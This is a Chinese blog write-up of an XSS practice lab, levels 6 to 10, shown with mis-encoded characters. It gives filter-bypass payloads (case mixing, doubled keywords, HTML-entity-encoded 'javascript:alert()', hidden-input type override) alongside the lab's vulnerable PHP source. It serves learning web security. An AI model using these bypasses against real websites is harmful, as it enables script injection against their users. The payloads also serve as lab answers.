<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a href=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸ</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡onå’Œerçš„è½¬ä¹‰ï¼š<br>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot; &gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>HIHI<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>éšä¾¿å¡«ä¸ªpayloadï¼Œç„¶åæŸ¥çœ‹é¡µé¢æºç ã€‚  </p>
<p>å‘ç°è¿™æ¬¡æ˜¯ç›´æ¥å§å…³é”®è¯è¿‡æ»¤äº†ï¼Œå¤§å°å†™ç»•ä¸è¿‡äº†ï¼›   </p>
<p>è”æƒ³åˆ°sqlæ³¨å…¥ç±»ä¼¼çš„åœºæ™¯ï¼ŒåŒå†™è¯•ä¸€ä¸‹ï¼Ÿ  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a hrhrefef=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸäº†ï¼Œä½†æ˜¯ç‚¹å‡»ä¸äº†ï¼Œæ¢ä¸€æ¡payloadçœ‹çœ‹å‘¢ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; oonnfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
<p>æˆåŠŸï¼  </p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>è¿™é‡Œå¤šäº†ä¸ªæ·»åŠ å‹æƒ…è¿æ¥ï¼Œå¤§æ¦‚å°±æ˜¯è¾“å…¥æ’å…¥é‡Œé¢ï¼Œæºç çœ‹ä¸€ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);<br> window.location.href=&quot;level9.php?keyword=not bad!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level8&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level8&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;finish&amp;quot; oonnfocus=javascript:alert(&#x27;xss&#x27;) &amp;quot;&quot;&gt;<br>&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;finish&amp;quot oo_nnfocus=javascr_ipt:alert(&#x27;xss&#x27;) &amp;quot&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payloadçš„é•¿åº¦:53&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>å¼ºåˆ¶è½¬åŒ–ä¸ºå°å†™å¹¶ä¸”å…¨éƒ¨è½¬ä¹‰ã€‚ã€‚ã€‚    </p>
<p>å¿ä¸ä½çœ‹æ¥ç½‘ä¸Šçš„wpï¼Œè¯´æ˜¯hrefä¼šè‡ªåŠ¨ç¼–è¯‘è‡ªå·±é“¾æ¥é‡Œçš„unioncodeï¼Œ  </p>
<p>ä½†ğŸˆ¶åˆé—®äº†ä¸€ä¸‹aiï¼š  </p>
<p><strong>åœ¨ HTML ä¸­ï¼Œhref å±æ€§æœ¬èº«ä¸ä¼šâ€œç¼–è¯‘â€ Unicodeï¼Œä½†æµè§ˆå™¨åœ¨è§£æ HTML å’Œå¤„ç† URL æ—¶ï¼Œä¼šæŒ‰ç…§æ ‡å‡†å¯¹ Unicode å­—ç¬¦è¿›è¡Œç¼–ç å’Œè§£ç ã€‚è¿™å¯èƒ½ä¼šè®©ä½ äº§ç”Ÿâ€œè‡ªåŠ¨ç¼–è¯‘â€çš„é”™è§‰ã€‚</strong></p>
<p>ç„¶åğŸˆ¶åˆæ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶ä¸æ˜¯æµè§ˆå™¨è§£æunioncodeçš„åŸå› ï¼Œæ˜¯hrefä¼šè§£æhtmlå®ä½“çš„åŸå›   </p>
<p>èƒ½é€šè¿‡å°†payloadç¼–è¯‘ä¸ºhtmlçš„åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶å®ä½“æ¥è¿›è¡Œç»•è¿‡ï¼š   </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ®µåœ¨èµ›åšå¨å­é‡Œè‡ªåŠ¨è¯†åˆ«ä¸ºï¼šHTML Entity<br>æ‰€ä»¥è¯´å¹¶ä¸æ˜¯unioncode</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>ä¸Šä¸€å…³çš„payloadå°±ç›´æ¥è¢«bandäº†ã€‚ã€‚ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);<br> window.location.href=&quot;level10.php?keyword=well done!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level9&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&quot;&gt;<br>&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payloadçš„é•¿åº¦:101&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>åªèƒ½å»çœ‹æºç äº†å—  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¿…é¡»è®©è¾“å…¥åŒ…å« http:&#x2F;&#x2F;ï¼Œå¦åˆ™ä¸ä¼šæŠŠæˆ‘ä»¬çš„è¾“å…¥æ’å…¥åˆ° href ä¸­ï¼  </p>
<p>è¿™æ ·çš„è¯ï¼Œä½¿ç”¨å†…è”æ³¨é‡Šä»˜ &#x2F;**&#x2F;,åœ¨sqlä¸­ä¹Ÿå¸¸ç”¨ä½œç©ºæ ¼ç»•è¿‡<br>payload:  </p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>è¿™å…³çš„æ³¨å…¥ç‚¹åœ¨urlä¸Š<br>çœ‹ç½‘ä¸Šwpï¼Œæœ‰å…¶ä»–ä¼ å‚å‚æ•°ï¼Ÿ  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level10&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level10&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>â€œt_sortâ€å°±è¿‡æ»¤äº†å°–æ‹¬å·è€Œå·²ï¼Œè¿˜æ˜¯ä¸Šç½‘æ‰¾äº†ç­”æ¡ˆï¼š</p>
<p>playlaod:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure>

<p>è¿™æ ·æºç å°±å˜æˆäº†ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ­¤æ—¶çš„ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ–°çš„type&#x3D;â€textâ€å°±è¦†ç›–äº†åŸæ¥çš„typeï¼Œå°±èƒ½è®©è¾“å…¥æ¡†æ˜¾ç¤ºå‡ºæ¥äº†  </p>
<p>éšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type&#x3D;â€textâ€æ˜¾ç¤º </p>
<p>aiçš„è§£é‡Šï¼š</p>
